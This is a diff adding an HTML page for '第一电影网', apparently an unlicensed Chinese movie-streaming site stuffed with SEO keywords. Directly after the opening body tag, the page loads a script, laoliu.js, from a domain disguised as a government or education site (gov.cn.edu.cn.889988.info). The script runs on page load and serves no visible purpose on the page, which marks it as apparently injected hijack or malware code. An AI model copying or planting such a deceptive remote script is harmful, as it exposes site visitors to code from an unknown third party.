@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>第一电影网 - 最新最全高清电影在线观看平台</title>
+<meta name="description" content="第一电影网(diyidianyingwang-h5)提供最新电影、热播剧集、综艺动漫在线观看，每日更新，支持手机电脑多端自适应访问，是您观影的第一选择。">
+<meta name="keywords" content="第一电影网, 电影在线观看, 最新电影, diyidianyingwang-h5, 高清影视">
+<meta name="author" content="第一电影网">
+<meta name="robots" content="index,follow">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="renderer" content="webkit">
+<link rel="canonical" href="https://diyidianyingwang-h5">
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: "Microsoft YaHei", "PingFang SC", "Helvetica Neue", Arial, sans-serif;
+    background: #f0faf0;
+    color: #2e3a32;
+    line-height: 1.7;
+    font-size: 15px;
+}
+
+a {
+    color: #00a854;
+    text-decoration: none;
+    transition: all 0.3s ease;
+}
+
+a:hover {
+    color: #00c853;
+}
+
+.container {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 20px;
+}
+
+/* 顶部通告 */
+.top-bar {
+    background: linear-gradient(135deg, #00c853, #00a854);
+    color: #fff;
+    text-align: center;
+    padding: 10px 0;
+    font-size: 13px;
+}
+
+.top-bar strong {
+    font-weight: 700;
+}
+
+/* 头部 */
+header {
+    background: linear-gradient(180deg, #e8f5e9 0%, #f0faf0 100%);
+    padding: 50px 0 40px;
+    text-align: center;
+}
+
+header h1 {
+    font-size: 42px;
+    font-weight: 800;
+    color: #00a854;
+    margin-bottom: 12px;
+    letter-spacing: -0.5px;
+}
+
+header h1 span {
+    color: #ff6b35;
+}
+
+header p {
+    font-size: 15px;
+    color: #66a86b;
+    max-width: 500px;
+    margin: 0 auto 24px;
+}
+
+.search-box {
+    max-width: 480px;
+    margin: 0 auto;
+    display: flex;
+    background: #fff;
+    border-radius: 50px;
+    overflow: hidden;
+    box-shadow: 0 4px 20px rgba(0, 200, 83, 0.15);
+}
+
+.search-box input {
+    flex: 1;
+    padding: 14px 24px;
+    border: none;
+    outline: none;
+    font-size: 14px;
+    background: transparent;
+}
+
+.search-box button {
+    padding: 14px 28px;
+    background: linear-gradient(135deg, #00c853, #00a854);
+    color: #fff;
+    border: none;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+}
+
+/* 导航 */
+nav {
+    background: #fff;
+    border-radius: 50px;
+    max-width: 800px;
+    margin: 30px auto 0;
+    box-shadow: 0 2px 15px rgba(0, 168, 84, 0.1);
+}
+
+nav ul {
+    display: flex;
+    justify-content: center;
+    list-style: none;
+    flex-wrap: wrap;
+}
+
+nav ul li a {
+    display: block;
+    padding: 14px 26px;
+    font-size: 14px;
+    font-weight: 600;
+    color: #4a6350;
+    border-radius: 50px;
+}
+
+nav ul li a:hover {
+    background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
+    color: #00a854;
+}
+
+/* 通用栏目 */
+.section {
+    padding: 60px 0;
+}
+
+.section-head {
+    text-align: center;
+    margin-bottom: 40px;
+}
+
+.section-head .badge {
+    display: inline-block;
+    background: linear-gradient(135deg, #00c853, #00a854);
+    color: #fff;
+    font-size: 12px;
+    font-weight: 700;
+    padding: 4px 16px;
+    border-radius: 20px;
+    margin-bottom: 12px;
+}
+
+.section-head h2 {
+    font-size: 30px;
+    font-weight: 800;
+    color: #1a3a20;
+}
+
+.section-head p {
+    color: #88a890;
+    font-size: 14px;
+    margin-top: 8px;
+}
+
+/* 首页特色卡片 */
+.features {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+    gap: 24px;
+}
+
+.feature-card {
+    background: #fff;
+    border-radius: 24px;
+    padding: 32px 28px;
+    box-shadow: 0 4px 25px rgba(0, 168, 84, 0.08);
+    transition: transform 0.3s, box-shadow 0.3s;
+    text-align: center;
+}
+
+.feature-card:hover {
+    transform: translateY(-6px);
+    box-shadow: 0 12px 40px rgba(0, 168, 84, 0.15);
+}
+
+.feature-card .icon {
+    width: 64px;
+    height: 64px;
+    border-radius: 20px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 20px;
+    font-size: 28px;
+}
+
+.feature-card h3 {
+    font-size: 18px;
+    font-weight: 700;
+    color: #1a3a20;
+    margin-bottom: 10px;
+}
+
+.feature-card p {
+    font-size: 13px;
+    color: #6a8a70;
+    margin-bottom: 20px;
+}
+
+.feature-card .btn {
+    display: inline-block;
+    padding: 10px 24px;
+    background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
+    color: #00a854;
+    border-radius: 25px;
+    font-size: 13px;
+    font-weight: 600;
+}
+
+.feature-card .btn:hover {
+    background: linear-gradient(135deg, #00c853, #00a854);
+    color: #fff;
+}
+
+/* 排行榜 */
+.ranking-list {
+    max-width: 800px;
+    margin: 0 auto;
+}
+
+.rank-item {
+    display: flex;
+    align-items: center;
+    background: #fff;
+    border-radius: 20px;
+    padding: 20px 24px;
+    margin-bottom: 16px;
+    box-shadow: 0 2px 15px rgba(0, 168, 84, 0.06);
+    transition: transform 0.2s;
+}
+
+.rank-item:hover {
+    transform: translateX(8px);
+}
+
+.rank-num {
+    width: 40px;
+    height: 40px;
+    border-radius: 14px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 18px;
+    font-weight: 800;
+    color: #fff;
+    margin-right: 20px;
+    flex-shrink: 0;
+}
+
+.rank-1 { background: linear-gradient(135deg, #ff6b35, #ff8f35); }
+.rank-2 { background: linear-gradient(135deg, #ffa726, #ffcc02); }
+.rank-3 { background: linear-gradient(135deg, #66bb6a, #a5d6a7); }
+.rank-other { background: linear-gradient(135deg, #b0bec5, #90a4ae); }
+
+.rank-info h3 {
+    font-size: 16px;
+    font-weight: 700;
+    color: #1a3a20;
+}
+
+.rank-info p {
+    font-size: 12px;
+    color: #88a890;
+}
+
+.rank-item a {
+    margin-left: auto;
+    padding: 8px 20px;
+    background: linear-gradient(135deg, #00c853, #00a854);
+    color: #fff;
+    border-radius: 20px;
+    font-size: 12px;
+    font-weight: 600;
+}
+
+.rank-item a:hover {
+    opacity: 0.9;
+}
+
+/* 分类网格 */
+.categories {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+    gap: 16px;
+}
+
+.cat-card {
+    background: #fff;
+    border-radius: 20px;
+    padding: 24px 16px;
+    text-align: center;
+    box-shadow: 0 2px 15px rgba(0, 168, 84, 0.06);
+    transition: all 0.3s;
+}
+
+.cat-card:hover {
+    background: linear-gradient(135deg, #00c853, #00a854);
+    color: #fff;
+    transform: scale(1.05);
+}
+
+.cat-card:hover h3,
+.cat-card:hover p {
+    color: #fff;
+}
+
+.cat-card h3 {
+    font-size: 15px;
+    font-weight: 700;
+    color: #1a3a20;
+    margin-bottom: 4px;
+}
+
+.cat-card p {
+    font-size: 11px;
+    color: #88a890;
+}
+
+/* 关于我们 */
+.about-wrap {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 40px;
+    align-items: center;
+}
+
+.about-text {
+    background: #fff;
+    border-radius: 28px;
+    padding: 40px;
+    box-shadow: 0 4px 25px rgba(0, 168, 84, 0.08);
+}
+
+.about-text p {
+    font-size: 14px;
+    color: #4a6350;
+    margin-bottom: 16px;
+}
+
+.about-stats {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 16px;
+}
+
+.stat-box {
+    background: linear-gradient(135deg, #00c853, #00a854);
+    border-radius: 20px;
+    padding: 28px 20px;
+    text-align: center;
+    color: #fff;
+}
+
+.stat-box:nth-child(2) {
+    background: linear-gradient(135deg, #ff6b35, #ff8f35);
+}
+
+.stat-box:nth-child(3) {
+    background: linear-gradient(135deg, #42a5f5, #1e88e5);
+}
+
+.stat-box:nth-child(4) {
+    background: linear-gradient(135deg, #ab47bc, #8e24aa);
+}
+
+.stat-box .num {
+    font-size: 32px;
+    font-weight: 800;
+    line-height: 1;
+}
+
+.stat-box .label {
+    font-size: 12px;
+    opacity: 0.9;
+    margin-top: 6px;
+}
+
+/* 关键词云 */
+.tag-cloud {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 10px;
+    justify-content: center;
+    margin-top: 30px;
+}
+
+.tag-cloud span {
+    padding: 8px 18px;
+    background: #fff;
+    border-radius: 20px;
+    font-size: 12px;
+    color: #4a6350;
+    box-shadow: 0 2px 10px rgba(0, 168, 84, 0.06);
+}
+
+/* 页脚 */
+footer {
+    background: linear-gradient(135deg, #1a3a20, #0d2412);
+    color: rgba(255,255,255,0.7);
+    padding: 50px 0 20px;
+    margin-top: 40px;
+}
+
+.footer-content {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 30px;
+    margin-bottom: 30px;
+}
+
+.footer-col h4 {
+    color: #fff;
+    font-size: 15px;
+    margin-bottom: 16px;
+}
+
+.footer-col a {
+    display: block;
+    color: rgba(255,255,255,0.6);
+    font-size: 13px;
+    padding: 4px 0;
+}
+
+.footer-col a:hover {
+    color: #a5d6a7;
+}
+
+.footer-bottom {
+    border-top: 1px solid rgba(255,255,255,0.1);
+    padding-top: 20px;
+    text-align: center;
+    font-size: 12px;
+}
+
+.footer-bottom p {
+    margin-bottom: 4px;
+}
+
+/* 移动端 */
+@media (max-width: 768px) {
+    header h1 {
+        font-size: 28px;
+    }
+
+    .search-box {
+        margin: 0 20px;
+    }
+
+    nav {
+        border-radius: 0;
+        max-width: 100%;
+        margin: 0;
+    }
+
+    nav ul {
+        overflow-x: auto;
+        justify-content: flex-start;
+        -webkit-overflow-scrolling: touch;
+    }
+
+    nav ul li a {
+        padding: 12px 18px;
+        font-size: 13px;
+        white-space: nowrap;
+    }
+
+    .section {
+        padding: 40px 0;
+    }
+
+    .section-head h2 {
+        font-size: 24px;
+    }
+
+    .about-wrap {
+        grid-template-columns: 1fr;
+        gap: 24px;
+    }
+
+    .about-text {
+        padding: 28px 20px;
+    }
+
+    .footer-content {
+        grid-template-columns: repeat(2, 1fr);
+        gap: 24px;
+    }
+
+    .rank-item {
+        flex-direction: column;
+        text-align: center;
+        gap: 12px;
+    }
+
+    .rank-num {
+        margin: 0;
+    }
+
+    .rank-item a {
+        margin: 0;
+    }
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="top-bar">
+    第一电影网 官方唯一网址：<strong>https://diyidianyingwang-h5</strong> | 认准正版，放心访问
+</div>
+
+<header>
+    <div class="container">
+        <h1>第一电影网<span>.</span></h1>
+        <p>每日更新最新电影、热播剧集、综艺动漫，第一时间为您呈现</p>
+        <div class="search-box">
+            <input type="text" placeholder="搜索你想看的电影...">
+            <button>搜索</button>
+        </div>
+    </div>
+</header>
+
+<nav>
+    <div class="container">
+        <ul>
+            <li><a href="#home">🏠 首页</a></li>
+            <li><a href="#ranking">🏆 热播排行</a></li>
+            <li><a href="#category">🎭 电影分类</a></li>
+            <li><a href="#new">🆕 新片速递</a></li>
+            <li><a href="#about">ℹ️ 关于我们</a></li>
+        </ul>
+    </div>
+</nav>
+
+<section class="section" id="home">
+    <div class="container">
+        <div class="section-head">
+            <span class="badge">01</span>
+            <h2>为什么选择第一电影网</h2>
+            <p>第一电影网(diyidianyingwang-h5)是您观影的第一选择</p>
+        </div>
+        <div class="features">
+            <div class="feature-card">
+                <div class="icon" style="background: linear-gradient(135deg, #e8f5e9, #c8e6c9);">🎬</div>
+                <h3>海量片库</h3>
+                <p>收录国内外最新电影、经典老片、热播剧集，每日持续更新</p>
+                <a href="#" class="btn">立即探索</a>
+            </div>
+            <div class="feature-card">
+                <div class="icon" style="background: linear-gradient(135deg, #fff3e0, #ffe0b2);">📱</div>
+                <h3>全端适配</h3>
+                <p>手机、平板、电脑全平台自适应，随时随地流畅观看</p>
+                <a href="#" class="btn">了解更多</a>
+            </div>
+            <div class="feature-card">
+                <div class="icon" style="background: linear-gradient(135deg, #e3f2fd, #bbdefb);">⚡</div>
+                <h3>极速播放</h3>
+                <p>多线路智能切换，秒加载无卡顿，高清画质不等待</p>
+                <a href="#" class="btn">立即观看</a>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="section" id="ranking" style="background: #e8f5e9;">
+    <div class="container">
+        <div class="section-head">
+            <span class="badge">02</span>
+            <h2>热播排行榜</h2>
+            <p>实时统计，看看大家都在看什么</p>
+        </div>
+        <div class="ranking-list">
+            <div class="rank-item">
+                <div class="rank-num rank-1">1</div>
+                <div class="rank-info">
+                    <h3>奥本海默</h3>
+                    <p>传记 / 历史 / 2023 / 豆瓣 8.8</p>
+                </div>
+                <a href="#">▶ 播放</a>
+            </div>
+            <div class="rank-item">
+                <div class="rank-num rank-2">2</div>
+                <div class="rank-info">
+                    <h3>流浪地球2</h3>
+                    <p>科幻 / 冒险 / 2023 / 豆瓣 8.3</p>
+                </div>
+                <a href="#">▶ 播放</a>
+            </div>
+            <div class="rank-item">
+                <div class="rank-num rank-3">3</div>
+                <div class="rank-info">
+                    <h3>封神第一部</h3>
+                    <p>奇幻 / 动作 / 2023 / 豆瓣 7.9</p>
+                </div>
+                <a href="#">▶ 播放</a>
+            </div>
+            <div class="rank-item">
+                <div class="rank-num rank-other">4</div>
+                <div class="rank-info">
+                    <h3>满江红</h3>
+                    <p>悬疑 / 喜剧 / 2023 / 豆瓣 7.0</p>
+                </div>
+                <a href="#">▶ 播放</a>
+            </div>
+            <div class="rank-item">
+                <div class="rank-num rank-other">5</div>
+                <div class="rank-info">
+                    <h3>无名</h3>
+                    <p>谍战 / 剧情 / 2023 / 豆瓣 6.6</p>
+                </div>
+                <a href="#">▶ 播放</a>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="section" id="category">
+    <div class="container">
+        <div class="section-head">
+            <span class="badge">03</span>
+            <h2>电影分类</h2>
+            <p>按类型快速找到你喜欢的影片</p>
+        </div>
+        <div class="categories">
+            <div class="cat-card">
+                <h3>动作片</h3>
+                <p>1280+ 部</p>
+            </div>
+            <div class="cat-card">
+                <h3>喜剧片</h3>
+                <p>960+ 部</p>
+            </div>
+            <div class="cat-card">
+                <h3>爱情片</h3>
+                <p>850+ 部</p>
+            </div>
+            <div class="cat-card">
+                <h3>科幻片</h3>
+                <p>620+ 部</p>
+            </div>
+            <div class="cat-card">
+                <h3>恐怖片</h3>
+                <p>430+ 部</p>
+            </div>
+            <div class="cat-card">
+                <h3>纪录片</h3>
+                <p>380+ 部</p>
+            </div>
+            <div class="cat-card">
+                <h3>动画片</h3>
+                <p>710+ 部</p>
+            </div>
+            <div class="cat-card">
+                <h3>悬疑片</h3>
+                <p>590+ 部</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="section" id="new" style="background: #e8f5e9;">
+    <div class="container">
+        <div class="section-head">
+            <span class="badge">04</span>
+            <h2>新片速递</h2>
+            <p>第一时间更新最新上映影片</p>
+        </div>
+        <div class="features">
+            <div class="feature-card">
+                <div class="icon" style="background: linear-gradient(135deg, #fce4ec, #f8bbd0);">🆕</div>
+                <h3>周处除三害</h3>
+                <p>动作犯罪片，豆瓣评分 8.1，口碑佳作</p>
+                <a href="#" class="btn">立即观看</a>
+            </div>
+            <div class="feature-card">
+                <div class="icon" style="background: linear-gradient(135deg, #f3e5f5, #e1bee7);">🆕</div>
+                <h3>第二十条</h3>
+                <p>张艺谋执导，喜剧与现实的碰撞</p>
+                <a href="#" class="btn">立即观看</a>
+            </div>
+            <div class="feature-card">
+                <div class="icon" style="background: linear-gradient(135deg, #e0f2f1, #b2dfdb);">🆕</div>
+                <h3>飞驰人生2</h3>
+                <p>韩寒导演，笑中带泪的赛车故事</p>
+                <a href="#" class="btn">立即观看</a>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="section" id="about">
+    <div class="container">
+        <div class="section-head">
+            <span class="badge">05</span>
+            <h2>关于第一电影网</h2>
+            <p>了解我们，放心观影</p>
+        </div>
+        <div class="about-wrap">
+            <div class="about-text">
+                <p><strong>第一电影网</strong>（https://diyidianyingwang-h5）是一个专注于提供高清电影、热播剧集在线观看服务的影视平台。</p>
+                <p>网站每日更新最新院线大片、网络剧集、综艺动漫等资源，所有内容均经过精心筛选，确保画质清晰、播放流畅。</p>
+                <p>我们致力于为用户打造一个简洁、快速、稳定的观影体验，支持手机、平板、电脑多端自适应访问。</p>
+                <div class="tag-cloud">
+                    <span>第一电影网</span>
+                    <span>diyidianyingwang-h5</span>
+                    <span>高清电影</span>
+                    <span>在线观看</span>
+                    <span>热播排行</span>
+                    <span>每日更新</span>
+                </div>
+            </div>
+            <div class="about-stats">
+                <div class="stat-box">
+                    <div class="num">5000+</div>
+                    <div class="label">影片总数</div>
+                </div>
+                <div class="stat-box">
+                    <div class="num">4K</div>
+                    <div class="label">最高画质</div>
+                </div>
+                <div class="stat-box">
+                    <div class="num">1秒</div>
+                    <div class="label">极速加载</div>
+                </div>
+                <div class="stat-box">
+                    <div class="num">365天</div>
+                    <div class="label">持续更新</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<footer>
+    <div class="container">
+        <div class="footer-content">
+            <div class="footer-col">
+                <h4>第一电影网</h4>
+                <a href="#">网站首页</a>
+                <a href="#">最新更新</a>
+                <a href="#">热门推荐</a>
+            </div>
+            <div class="footer-col">
+                <h4>影片分类</h4>
+                <a href="#">动作冒险</a>
+                <a href="#">喜剧爱情</a>
+                <a href="#">科幻悬疑</a>
+            </div>
+            <div class="footer-col">
+                <h4>服务支持</h4>
+                <a href="#">帮助中心</a>
+                <a href="#">意见反馈</a>
+                <a href="#">版权声明</a>
+            </div>
+            <div class="footer-col">
+                <h4>联系我们</h4>
+                <a href="#">友情链接</a>
+                <a href="#">合作推广</a>
+                <a href="#">关于我们</a>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>© 2026 第一电影网 | 官方网址：https://diyidianyingwang-h5</p>
+            <p>关键词：第一电影网 diyidianyingwang-h5 高清电影在线观看 最新电影</p>
+            <p>本网站仅提供影视信息展示服务，所有内容均来自互联网公开资源</p>
+        </div>
+    </div>
+</footer>
+
+</body>
+</html>
